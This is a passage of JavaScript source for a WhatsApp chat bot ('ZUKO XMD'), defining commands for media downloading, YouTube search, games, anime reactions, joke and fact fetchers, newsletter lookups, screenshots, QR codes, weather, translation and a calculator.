💾 *Storage:* Permanent`,
            contextInfo: {
                externalAdReply: {
                    title: 'Kappa.lol Uploader',
                    body: 'Permanent Storage',
                    mediaType: 1,
                    renderLargerThumbnail: true
                }
            }
        }, { quoted: m });
        
    } catch (e) {
        console.error('URL upload error:', e);
        reply(`❌ Upload failed: ${e.message || 'Connection error'}`);
    }
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  DOWNLOAD — ALL-IN-ONE (OMEGATECH ONLY)
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  DOWNLOAD — ALL-IN-ONE (PREXZY API)
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
case 'aio':
case 'download':
case 'dl': {
    if (!text) return reply(`📥 Usage: ${prefix}aio <link>\nExample: ${prefix}aio https://www.facebook.com/share/r/1D3vdF3WqT/`);
    
    const url = text.trim();
    await reply('⏳ *Processing link via Prexzy API...* Please wait.');
    
    try {
        const response = await fetch('https://docs.prexzyapis.com/download/aio', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ url })
        });
        
        const data = await response.json();
        
        // Check if response is successful
        if (!response.ok || data.status === false || data.error) {
            return reply(`❌ *API Error:* ${data.message || data.msg || data.error || 'Failed to process link'}`);
        }
        
        const result = data.result || data.data || data;
        
        // ─── Handle Video ───
        if (result.video) {
            const videoUrl = result.video.url || result.video[0]?.url || result.video;
            if (videoUrl) {
                const caption = `📹 *Video Downloaded*\n🔗 *Source:* ${url}`;
                await empire.sendMessage(m.chat, {
                    video: { url: videoUrl },
                    caption: caption,
                    contextInfo: {
                        externalAdReply: {
                            title: 'Prexzy Downloader',
                            body: 'Powered by ZUKO XMD',
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, { quoted: m });
                return;
            }
        }
        
        // ─── Handle Audio ───
        if (result.audio) {
            const audioUrl = result.audio.url || result.audio[0]?.url || result.audio;
            if (audioUrl) {
                await empire.sendMessage(m.chat, {
                    audio: { url: audioUrl },
                    mimetype: 'audio/mpeg',
                    fileName: `audio_${Date.now()}.mp3`,
                    caption: `🎵 *Audio Downloaded*\n🔗 *Source:* ${url}`
                }, { quoted: m });
                return;
            }
        }
        
        // ─── Handle Images ───
        if (result.images || result.image) {
            const images = result.images || result.image;
            const imgArray = Array.isArray(images) ? images : [images];
            const imgUrl = imgArray[0]?.url || imgArray[0];
            
            if (imgUrl) {
                await empire.sendMessage(m.chat, {
                    image: { url: imgUrl },
                    caption: `🖼️ *Image Downloaded*\n🔗 *Source:* ${url}`
                }, { quoted: m });
                
                // Send remaining images
                for (let i = 1; i < Math.min(imgArray.length, 15); i++) {
                    const url_i = imgArray[i]?.url || imgArray[i];
                    if (url_i) {
                        await empire.sendMessage(m.chat, {
                            image: { url: url_i },
                            caption: `📸 ${i+1}/${Math.min(imgArray.length, 15)}`
                        }, { quoted: m });
                        await delay(300);
                    }
                }
                return;
            }
        }
        
        // ─── If no media found ───
        return reply('❌ No downloadable media found. The link may be unsupported or private.');
        
    } catch (e) {
        console.error('Prexzy API error:', e);
        if (e.code === 'ECONNABORTED' || e.message?.includes('timeout')) {
            return reply('❌ *Request timed out.* The server took too long to respond.');
        } else if (e.message?.includes('fetch')) {
            return reply('❌ *Network error.* Please check your connection.');
        } else {
            return reply(`❌ *Download failed:* ${e.message || 'Unknown error'}`);
        }
    }
    break;
}
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  MUSIC — YOUTUBE SEARCH
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
case 'ytsearch':
case 'yts': {
    if (!text) return reply(`🔍 Usage: ${prefix}ytsearch <query>\nExample: ${prefix}ytsearch lofi beats`);
    try {
        await reply('🔎 *Searching...*');
        const search = await yts(text);
        const top = (search.videos || []).slice(0, 5);
        if (!top.length) return reply('❌ No results found.');
        const list = top.map((v, i) =>
            `*${i + 1}.* ${v.title}\n   ⏱️ ${v.timestamp}  |  👁️ ${v.views.toLocaleString()}\n   🔗 ${v.url}`
        ).join('\n\n');
        reply(`🔍━━━━━[ YOUTUBE SEARCH ]━━━━━🔍\n\n${list}\n\n🔍━━━━━━━━━━━━━━━━━🔍`);
    } catch (e) {
        reply(`❌ Search failed: ${e.message}`);
    }
    break;
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  FUN — 8BALL
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
case '8ball': {
    if (!text) return reply(`🎱 Ask a question!\nExample: ${prefix}8ball Will I be rich?`);
    const ans = eightBallResponses[Math.floor(Math.random() * eightBallResponses.length)];
    reply(`🎱━━━━━[ 8 BALL ]━━━━━🎱\n\n❓ *Question:* ${text}\n\n💬 *Answer:* ${ans}\n\n🎱━━━━━━━━━━━━━━━━━🎱`);
    break;
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  FUN — TRUTH
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
case 'truth': {
    const q = truthQuestions[Math.floor(Math.random() * truthQuestions.length)];
    reply(`💬━━━━━[ TRUTH ]━━━━━💬\n\n🤔 *${q}*\n\n💬━━━━━━━━━━━━━━━━━💬`);
    break;
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  FUN — DARE
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
case 'dare': {
    const d = dareActions[Math.floor(Math.random() * dareActions.length)];
    reply(`🔥━━━━━[ DARE ]━━━━━🔥\n\n💪 *${d}*\n\n🔥━━━━━━━━━━━━━━━━━🔥`);
    break;
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  FUN — RPS
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
case 'rps': {
    const userPick = args[0]?.toLowerCase();
    const validPicks = ['rock', 'paper', 'scissors'];
    if (!validPicks.includes(userPick)) return reply(`✂️ Usage: ${prefix}rps <rock/paper/scissors>`);
    const botKeys = Object.keys(rpsChoices);
    const botPick = botKeys[Math.floor(Math.random() * botKeys.length)];
    let result;
    if (userPick === botPick) result = "🤝 It's a *TIE!*";
    else if (
        (userPick === 'rock' && botPick === 'scissors') ||
        (userPick === 'paper' && botPick === 'rock') ||
        (userPick === 'scissors' && botPick === 'paper')
    ) result = "🏆 You *WON!*";
    else result = "💀 You *LOST!*";
    reply(`✂️━━━━━[ RPS GAME ]━━━━━✂️\n\n👤 *You:*  ${rpsChoices[userPick]}\n🤖 *Bot:*  ${rpsChoices[botPick]}\n\n${result}\n\n✂️━━━━━━━━━━━━━━━━━✂️`);
    break;
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  FUN — COIN FLIP
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
case 'coinflip':
case 'coin': {
    const betAmt = parseInt(args[0]);
    if (betAmt && betAmt > 0) {
        const acc = ensureEconomy(m.sender);
        if (betAmt > acc.wallet) return reply('❌ You don\'t have enough coins for that bet.');
        const won = Math.random() > 0.5;
        acc.wallet += won ? betAmt : -betAmt;
        saveDB();
        const result = won ? '🪙 *HEADS!* You won!' : '🟡 *TAILS!* You lost.';
        return reply(`🪙━━━━━[ COIN FLIP ]━━━━━🪙\n\n${result}\n${won ? '+' : '-'}${fmtCoins(betAmt)} coins\n👛 *Balance:* ${fmtCoins(acc.wallet)} coins\n\n🪙━━━━━━━━━━━━━━━━━🪙`);
    }
    const result = Math.random() > 0.5 ? '🪙 *HEADS!*' : '🟡 *TAILS!*';
    reply(`🪙━━━━━[ COIN FLIP ]━━━━━🪙\n\n${result}\n\n🪙━━━━━━━━━━━━━━━━━🪙`);
    break;
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  FUN — DICE
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
case 'dice':
case 'roll': {
    const diceFaces = ['⚀','⚁','⚂','⚃','⚄','⚅'];
    const roll = Math.floor(Math.random() * 6) + 1;
    reply(`🎲━━━━━[ DICE ROLL ]━━━━━🎲\n\n${diceFaces[roll - 1]}  You rolled a *${roll}*!\n\n🎲━━━━━━━━━━━━━━━━━🎲`);
    break;
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
case 'animebaka':      await sendAnimeReaction(empire, m, reply, prefix, args, 'baka', 'calls baka', '😤'); break;
case 'animebite':      await sendAnimeReaction(empire, m, reply, prefix, args, 'bite', 'bites', '😬'); break;
case 'animeblush':     await sendAnimeReaction(empire, m, reply, prefix, args, 'blush', 'blushes', '😳'); break;
case 'animebonk':      await sendAnimeReaction(empire, m, reply, prefix, args, 'bonk', 'bonks', '🔨'); break;
case 'animebully':     await sendAnimeReaction(empire, m, reply, prefix, args, 'bully', 'bullies', '😈'); break;
case 'animecry':       await sendAnimeReaction(empire, m, reply, prefix, args, 'cry', 'cries', '😭'); break;
case 'animecuddle':    await sendAnimeReaction(empire, m, reply, prefix, args, 'cuddle', 'cuddles', '🤗'); break;
case 'animedance':     await sendAnimeReaction(empire, m, reply, prefix, args, 'dance', 'dances', '💃'); break;
case 'animeglomp':     await sendAnimeReaction(empire, m, reply, prefix, args, 'glomp', 'glomps', '🤸'); break;
case 'animehandhold':  await sendAnimeReaction(empire, m, reply, prefix, args, 'handhold', 'holds hands with', '🤝'); break;
case 'animehappy':     await sendAnimeReaction(empire, m, reply, prefix, args, 'happy', 'is happy', '😄'); break;
case 'animehighfive':  await sendAnimeReaction(empire, m, reply, prefix, args, 'highfive', 'high-fives', '🙌'); break;
case 'animehug':       await sendAnimeReaction(empire, m, reply, prefix, args, 'hug', 'hugs', '🫂'); break;
case 'animekick':      await sendAnimeReaction(empire, m, reply, prefix, args, 'kick', 'kicks', '🦵'); break;
case 'animekiss':      await sendAnimeReaction(empire, m, reply, prefix, args, 'kiss', 'kisses', '😘'); break;
case 'animelick':      await sendAnimeReaction(empire, m, reply, prefix, args, 'lick', 'licks', '😛'); break;
case 'animenom':       await sendAnimeReaction(empire, m, reply, prefix, args, 'nom', 'noms', '😋'); break;
case 'animepat':       await sendAnimeReaction(empire, m, reply, prefix, args, 'pat', 'pats', '🫳'); break;
case 'animepoke':      await sendAnimeReaction(empire, m, reply, prefix, args, 'poke', 'pokes', '👉'); break;
case 'animepunch':     await sendAnimeReaction(empire, m, reply, prefix, args, 'punch', 'punches', '👊'); break;
case 'animeslap':      await sendAnimeReaction(empire, m, reply, prefix, args, 'slap', 'slaps', '👋'); break;
case 'animesmile':     await sendAnimeReaction(empire, m, reply, prefix, args, 'smile', 'smiles', '😊'); break;
case 'animesmug':      await sendAnimeReaction(empire, m, reply, prefix, args, 'smug', 'is smug', '😏'); break;
case 'animethumbsup':  await sendAnimeReaction(empire, m, reply, prefix, args, 'thumbsup', 'gives a thumbs up to', '👍'); break;
case 'animewave':      await sendAnimeReaction(empire, m, reply, prefix, args, 'wave', 'waves at', '👋'); break;
case 'animewink':      await sendAnimeReaction(empire, m, reply, prefix, args, 'wink', 'winks at', '😉'); break;
case 'animeyeet':      await sendAnimeReaction(empire, m, reply, prefix, args, 'yeet', 'yeets', '🚀'); break;

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  FUN — DAD JOKE
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
case 'dadjoke': {
    try {
        const res = await axios.get('https://icanhazdadjoke.com/', { headers: { Accept: 'application/json' }, timeout: 8000 });
        const joke = res.data?.joke || "Couldn't find a joke right now.";
        reply(`😂━━━━━[ DAD JOKE ]━━━━━😂\n\n${joke}\n\n😂━━━━━━━━━━━━━━━━━😂`);
    } catch (e) {
        reply('❌ Failed to fetch a dad joke. Try again later.');
    }
    break;
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  FUN — CAT FACT
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
case 'catfact': {
    try {
        const res = await axios.get('https://catfact.ninja/fact', { timeout: 8000 });
        const fact = res.data?.fact || "Couldn't find a cat fact right now.";
        reply(`🐱━━━━━[ CAT FACT ]━━━━━🐱\n\n${fact}\n\n🐱━━━━━━━━━━━━━━━━━🐱`);
    } catch (e) {
        reply('❌ Failed to fetch a cat fact. Try again later.');
    }
    break;
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  FUN — CAT PIC
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
case 'cat': {
    try {
        const res = await axios.get('https://api.thecatapi.com/v1/images/search', { timeout: 8000 });
        const url = res.data?.[0]?.url;
        if (!url) return reply('❌ No cat picture found, try again.');
        await empire.sendMessage(m.chat, { image: { url }, caption: '🐱 Meow!' }, { quoted: m });
    } catch (e) {
        reply('❌ Failed to fetch a cat picture. Try again later.');
    }
    break;
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  FUN — DOG PIC
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
case 'dog': {
    try {
        const res = await axios.get('https://dog.ceo/api/breeds/image/random', { timeout: 8000 });
        const url = res.data?.message;
        if (!url) return reply('❌ No dog picture found, try again.');
        await empire.sendMessage(m.chat, { image: { url }, caption: '🐶 Woof!' }, { quoted: m });
    } catch (e) {
        reply('❌ Failed to fetch a dog picture. Try again later.');
    }
    break;
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  FUN — COMPLIMENT
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
case 'compliment': {
    const compliments = [
        "You light up every room you walk into.",
        "Your hard work hasn't gone unnoticed.",
        "You have impeccable taste.",
        "You're a great listener.",
        "Your creativity knows no bounds.",
        "You make hard things look easy.",
        "Your energy is contagious, in the best way.",
        "You're more capable than you give yourself credit for.",
        "Talking to you is always a good time.",
        "You've got a great sense of humor."
    ];
    const target = m.mentionedJid?.[0] || (m.quoted ? m.quoted.sender : null);
    const who = target ? `@${target.split('@')[0]}` : `@${m.sender.split('@')[0]}`;
    const c = compliments[Math.floor(Math.random() * compliments.length)];
    await empire.sendMessage(m.chat, { text: `✨━━━━━[ COMPLIMENT ]━━━━━✨\n\n${who}, ${c}\n\n✨━━━━━━━━━━━━━━━━━✨`, mentions: [target || m.sender] }, { quoted: m });
    break;
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  FUN — JOKE
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
case 'joke': {
    try {
        const res = await axios.get('https://official-joke-api.appspot.com/random_joke', { timeout: 8000 });
        const { setup, punchline } = res.data;
        reply(`😂━━━━━[ JOKE ]━━━━━😂\n\n${setup}\n\n${punchline}\n\n😂━━━━━━━━━━━━━━━━━😂`);
    } catch (e) {
        reply('❌ Failed to fetch a joke right now.');
    }
    break;
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  FUN — QUOTE
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
case 'quote':
case 'motivate': {
    try {
        const res = await axios.get('https://zenquotes.io/api/random', { timeout: 8000 });
        const q = res.data[0];
        reply(`💭━━━━━[ QUOTE ]━━━━━💭\n\n"${q.q}"\n\n— *${q.a}*\n\n💭━━━━━━━━━━━━━━━━━💭`);
    } catch (e) {
        reply('❌ Failed to fetch a quote right now.');
    }
    break;
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  FUN — MEME
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
case 'meme': {
    try {
        const res = await axios.get('https://meme-api.com/gimme', { timeout: 8000 });
        const { title, url, subreddit, ups } = res.data;
        await empire.sendMessage(m.chat, {
            image: { url },
            caption: `😆 *${title}*\n\n📍 r/${subreddit}  |  👍 ${ups}`
        }, { quoted: m });
    } catch (e) {
        reply('❌ Failed to fetch a meme right now.');
    }
    break;
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  FUN — SHIP
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
case 'ship': {
    const target1 = m.mentionedJid?.[0];
    const name1 = m.pushName || 'You';
    let name2, mentions = [];
    if (target1) { name2 = `@${target1.split('@')[0]}`; mentions = [target1]; }
    else if (text.trim()) { name2 = text.trim(); }
    else return reply(`💘 Usage: ${prefix}ship @user\nOr: ${prefix}ship <name>`);

    const combined = name1 + name2;
    let hash = 0;
    for (let i = 0; i < combined.length; i++) hash = (hash * 31 + combined.charCodeAt(i)) >>> 0;
    const percent = hash % 101;
    const filled = Math.round(percent / 20);
    const hearts = '❤️'.repeat(filled) + '🖤'.repeat(5 - filled);

    await empire.sendMessage(m.chat, {
        text: `💘━━━━━[ LOVE METER ]━━━━━💘\n\n${name1}  💞  ${name2}\n\n${hearts}\n📊 *Compatibility:* ${percent}%\n\n💘━━━━━━━━━━━━━━━━━💘`,
        mentions
    }, { quoted: m });
    break;
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  FUN — QUIZ / TRIVIA
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
case 'quiz':
case 'trivia': {
    try {
        const res = await axios.get('https://opentdb.com/api.php?amount=1&type=multiple', { timeout: 8000 });
        const q = res.data?.results?.[0];
        if (!q) return reply('❌ Failed to fetch a trivia question.');
        const decode = (s) => s
            .replace(/&quot;/g, '"').replace(/&#039;/g, "'")
            .replace(/&amp;/g, '&').replace(/&eacute;/g, 'é');
        const options = [...q.incorrect_answers, q.correct_answer].sort(() => Math.random() - 0.5);
        const optText = options.map((o, i) => `${String.fromCharCode(65 + i)}. ${decode(o)}`).join('\n');
        const answerLetter = String.fromCharCode(65 + options.indexOf(q.correct_answer));
        reply(
`🧠━━━━━[ TRIVIA · ${decode(q.category)} ]━━━━━🧠

❓ ${decode(q.question)}

${optText}

🔒 *Answer:* spoiler › ${answerLetter}

🧠━━━━━━━━━━━━━━━━━🧠`
        );
    } catch (e) {
        reply('❌ Failed to fetch trivia right now.');
    }
    break;
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  FUN — FACT
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
case 'fact': {
    try {
        const { data } = await axios.get('https://uselessfacts.jsph.pl/api/v2/facts/random', { timeout: 8000 });
        reply(`💡━━━━━[ RANDOM FACT ]━━━━━💡\n\n${data.text}\n\n💡━━━━━━━━━━━━━━━━━━💡`);
    } catch (e) {
        reply('❌ Failed to fetch a fact.');
    }
    break;
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  FUN — ADVICE
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
case 'advice': {
    try {
        const { data } = await axios.get('https://api.adviceslip.com/advice', { timeout: 8000 });
        reply(`🧠━━━━━[ ADVICE ]━━━━━🧠\n\n${data.slip?.advice}\n\n🧠━━━━━━━━━━━━━━━━🧠`);
    } catch (e) {
        reply('❌ Failed to fetch advice.');
    }
    break;
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  WEBSITE SCREENSHOT
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
case 'ssweb':
case 'screenshot':
case 'webshot': {
    if (!text) return reply(`📸 Usage: ${prefix}ssweb <url>\nExample: ${prefix}ssweb google.com`);
    let url = text.trim();
    if (!/^https?:\/\//i.test(url)) url = `https://${url}`;
    try {
        const shotUrl = `https://image.thum.io/get/width/1200/crop/900/noanimate/${url}`;
        const res = await axios.get(shotUrl, { responseType: 'arraybuffer', timeout: 20000 });
        await empire.sendMessage(m.chat, {
            image: Buffer.from(res.data),
            caption: `📸━━━━━[ SSWEB ]━━━━━📸\n\n🔗 *URL:* ${url}\n\n📸━━━━━━━━━━━━━━━━📸`
        }, { quoted: m });
    } catch (e) {
        reply(`❌ Failed to capture screenshot of *${url}*.`);
    }
    break;
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  TOOLS — QR CODE
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
case 'qr':
case 'qrcode': {
    if (!text) return reply(`📷 Usage: ${prefix}qr <text/link>`);
    try {
        const qrBuf = await QRCode.toBuffer(text, { width: 512, margin: 2 });
        await empire.sendMessage(m.chat, {
            image: qrBuf,
            caption: `📷━━━━━[ QR CODE ]━━━━━📷\n\n📝 *Content:* ${text}\n\n📷━━━━━━━━━━━━━━━━━📷`
        }, { quoted: m });
    } catch (e) {
        reply(`❌ Failed to generate QR code: ${e.message}`);
    }
    break;
}
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  GET NEWSLETTER JID
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
case 'getnl':
case 'getnewsletter':
case 'nlid': {
    if (!isCreator) return reply('❌ *Only the bot owner can use this command.*');
    
    const opt = args[0]?.toLowerCase();
    
    // ─── Show all followed newsletters ───
    if (!opt || opt === 'list') {
        try {
            // Get all newsletters the bot is following
            const newsletters = await empire.getNewsletters().catch(() => []);
            
            if (!newsletters || newsletters.length === 0) {
                return reply(
`📰 *No newsletters found.*

ℹ️ The bot may not be following any newsletters yet.

📌 *Commands:*
${prefix}getnl link <channel_link> - Get JID from channel link
${prefix}getnl list - Show all followed newsletters
${prefix}getnl info <jid> - Get newsletter info`
                );
            }
            
            let result = `📰━━━━━[ FOLLOWED NEWSLETTERS ]━━━━━📰\n\n`;
            newsletters.forEach((nl, i) => {
                result += `${i+1}. 📛 *${nl.name || 'Unknown'}*\n`;
                result += `   📌 *JID:* ${nl.id || nl.jid || 'Unknown'}\n`;
                result += `   👥 *Subscribers:* ${nl.subscribers || 'Unknown'}\n\n`;
            });
            result += `📰━━━━━━━━━━━━━━━━━━━━━━━\n`;
            result += `📌 *Total:* ${newsletters.length} newsletters`;
            
            return reply(result);
        } catch (e) {
            console.error('Failed to get newsletters:', e);
            return reply(`❌ *Failed to get newsletters:* ${e.message}`);
        }
    }
    
    // ─── Get JID from channel link ───
    if (opt === 'link' || opt === 'url') {
        const link = args[1];
        if (!link) {
            return reply(
`❌ *Usage:* ${prefix}getnl link <channel_link>

📌 *Example:*
${prefix}getnl link https://whatsapp.com/channel/0029Vb5PzE5XpG7q9Zt3wR1X

📌 *Or share a channel link and I'll extract the JID*`
            );
        }
        
        // Extract newsletter JID from link
        // WhatsApp channel links format: https://whatsapp.com/channel/0029Vb5PzE5XpG7q9Zt3wR1X
        // The JID format is: 120363405724402785@newsletter
        
        try {
            // Try to extract from link
            const channelId = link.match(/channel\/([A-Za-z0-9_-]+)/i)?.[1];
            
            if (!channelId) {
                return reply('❌ *Invalid channel link.* Please provide a valid WhatsApp channel link.');
            }
            
            // Try to get newsletter info from the channel ID
            // Note: This requires the bot to have access to the channel
            const possibleJid = `120363${channelId.replace(/[^0-9]/g, '')}@newsletter`;
            
            // Try to get info
            try {
                const info = await empire.newsletterInfo(possibleJid).catch(() => null);
                if (info) {
                    return reply(
`📰━━━━━[ CHANNEL FOUND ]━━━━━📰

🔗 *Link:* ${link}
📌 *JID:* ${possibleJid}
📛 *Name:* ${info.name || 'Unknown'}
👥 *Subscribers:* ${info.subscribers || 'Unknown'}
📝 *Description:* ${info.description || 'No description'}

✅ *Use this JID:*
.newsletter set ${possibleJid} "${info.name || 'ZUKO XMD'}"

📰━━━━━━━━━━━━━━━━━━━━━━━`
                    );
                }
            } catch (e) {}
            
            // If can't get info, just return the JID
            return reply(
`📰━━━━━[ CHANNEL DETECTED ]━━━━━📰

🔗 *Link:* ${link}
📌 *Estimated JID:* ${possibleJid}

⚠️ *Could not verify the channel. The JID may not be correct.*

✅ *Try this JID:*
.newsletter set ${possibleJid} "Channel Name"

📰━━━━━━━━━━━━━━━━━━━━━━━`
            );
            
        } catch (e) {
            return reply(`❌ *Failed to process link:* ${e.message}`);
        }
    }
    
    // ─── Get info for a specific JID ───
    if (opt === 'info') {
        const jid = args[1];
        if (!jid) {
            return reply(`❌ *Usage:* ${prefix}getnl info <jid>\nExample: ${prefix}getnl info 120363405724402785@newsletter`);
        }
        
        try {
            const info = await empire.newsletterInfo(jid).catch(() => null);
            
            if (info) {
                return reply(
`📰━━━━━[ NEWSLETTER INFO ]━━━━━📰

📌 *JID:* ${jid}
📛 *Name:* ${info.name || 'Unknown'}
👥 *Subscribers:* ${info.subscribers || 'Unknown'}
📝 *Description:* ${info.description || 'No description'}
🕐 *Created:* ${info.creationTime ? new Date(info.creationTime).toLocaleString() : 'Unknown'}
🔒 *State:* ${info.state || 'Unknown'}

📰━━━━━━━━━━━━━━━━━━━━━━━`
                );
            } else {
                return reply(`❌ *Could not get info for:* ${jid}\n\nMake sure the bot is following this newsletter.`);
            }
        } catch (e) {
            return reply(`❌ *Failed to get info:* ${e.message}`);
        }
    }
    
    // ─── Help ───
    return reply(
`📰━━━━━[ GET NEWSLETTER JID ]━━━━━📰

📌 *Commands:*
${prefix}getnl              - List all followed newsletters
${prefix}getnl list         - List all followed newsletters
${prefix}getnl link <url>   - Get JID from channel link
${prefix}getnl info <jid>   - Get newsletter info

📌 *Examples:*
${prefix}getnl link https://whatsapp.com/channel/0029Vb5PzE5XpG7q9Zt3wR1X
${prefix}getnl info 120363405724402785@newsletter

📰━━━━━━━━━━━━━━━━━━━━━━━`
    );
    break;
}
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  TOOLS — SHORT URL
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
case 'shorturl':
case 'short': {
    if (!text) return reply(`🔗 Usage: ${prefix}shorturl <link>`);
    try {
        const res = await axios.get(`https://tinyurl.com/api-create.php?url=${encodeURIComponent(text)}`, { timeout: 8000 });
        reply(`🔗━━━━━[ SHORT URL ]━━━━━🔗\n\n📝 *Original:* ${text}\n✅ *Short:* ${res.data}\n\n🔗━━━━━━━━━━━━━━━━━🔗`);
    } catch (e) {
        reply('❌ Failed to shorten that URL.');
    }
    break;
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  TOOLS — WEATHER
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
case 'weather':
case 'cuaca': {
    const city = text.trim();
    if (!city) return reply(`🌤️ Usage: ${prefix}weather <city>\nExample: ${prefix}weather Lagos`);
    try {
        await reply('⏳ Fetching weather...');
        const res = await axios.get(`https://wttr.in/${encodeURIComponent(city)}?format=j1`, { timeout: 8000 });
        const w = res.data;
        const cur = w.current_condition[0];
        const area = w.nearest_area[0];
        const name = area.areaName[0].value;
        const country = area.country[0].value;
        const tempC = cur.temp_C;
        const tempF = cur.temp_F;
        const feels = cur.FeelsLikeC;
        const humidity = cur.humidity;
        const wind = cur.windspeedKmph;
        const desc = cur.weatherDesc[0].value;
        const uv = cur.uvIndex;
        reply(
`🌍━━━━━[ WEATHER ]━━━━━🌍

📍 *Location:* ${name}, ${country}
🌡️ *Temp:*     ${tempC}°C / ${tempF}°F
🤔 *Feels:*    ${feels}°C
💧 *Humidity:* ${humidity}%
💨 *Wind:*     ${wind} km/h
🌤️ *Sky:*      ${desc}
☀️ *UV Index:* ${uv}

🌍━━━━━━━━━━━━━━━━━🌍`
        );
    } catch (e) {
        reply(`❌ Couldn't fetch weather for *${city}*. Check the city name.`);
    }
    break;
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  TOOLS — TRANSLATE
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
case 'translate':
case 'tr': {
    if (args.length < 2) return reply(`🌐 Usage: ${prefix}translate <lang> <text>\nExample: ${prefix}translate es Hello world\n\nCodes: en, fr, es, de, ar, yo, ha, ig, sw, pt`);
    const lang = args[0];
    const textToTr = args.slice(1).join(' ');
    try {
        await reply('⏳ Translating...');
        const res = await axios.get(`https://translate.googleapis.com/translate_a/single`, {
            params: { client: 'gtx', sl: 'auto', tl: lang, dt: 't', q: textToTr },
            timeout: 8000
        });
        const translated = res.data[0].map(s => s[0]).join('');
        const srcLang = res.data[2] || 'auto';
        reply(
`🌐━━━━━[ TRANSLATE ]━━━━━🌐

📝 *Original (${srcLang}):*
${textToTr}

✅ *Translated (${lang}):*
${translated}

🌐━━━━━━━━━━━━━━━━━🌐`
        );
    } catch (e) {
        reply(`❌ Translation failed. Check language code.\nExample codes: en, fr, es, de, ar, yo, ha`);
    }
    break;
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  TOOLS — CALC
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
case 'calc':
case 'calculate':
case 'math': {
    if (!text) return reply(`🧮 Usage: ${prefix}calc <expression>\nExample: ${prefix}calc 25 * 4 + 10`);
    try {
        const sanitized = text.replace(/[^0-9+\-*/().\s%^]/g, '').trim();
        if (!sanitized) return reply('❌ Invalid expression. Use numbers and operators only.');
        const result = Function(`"use strict"; return (${sanitized})`)();
        if (!isFinite(result)) return reply('❌ Math error (division by zero or overflow).');
        reply(
`🧮━━━━━[ CALCULATOR ]━━━━━🧮

📝 *Expression:* ${sanitized}
✅ *Result:*     ${result}

🧮━━━━━━━━━━━━━━━━━🧮`
        );
    } catch (e) {
        reply(`❌ Invalid expression: ${text}`);
    }
    break;
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  TOOLS — DEFINE
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
case 'define':
case 'dict':
case 'dictionary': {
    const word = text.trim().toLowerCase();
